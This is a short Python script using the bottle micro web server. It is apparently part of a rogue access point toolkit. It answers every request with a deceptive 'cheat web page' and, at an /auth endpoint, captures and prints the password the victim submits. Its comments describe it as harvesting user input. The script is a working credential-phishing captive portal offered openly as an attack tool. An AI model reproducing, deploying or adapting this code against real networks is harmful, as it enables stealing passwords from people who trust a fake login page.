#! /usr/bin/env python3
"""
Create http server on port 80, by using micro web server bottle.py.
"""

from bottle import static_file, run, route, request

# no matter what the client request, always response a cheat web page.
@route('<pname:path>', method=['GET', 'POST'])
def server_static(pname):
	return static_file('helpinfo.html', root='.')

# harvest what client user input
@route('/auth', method='POST')
def do_auth():
    password   = request.forms.get('password')
    print("\n****** Got password \"{}\" ******\n".format(password))
    return 'OK'

if __name__ == '__main__':
    import sys
    sys.path.append("../")
    from public import AP_IP, HTTP_PORT
    run(host=AP_IP, port=HTTP_PORT, debug=True)
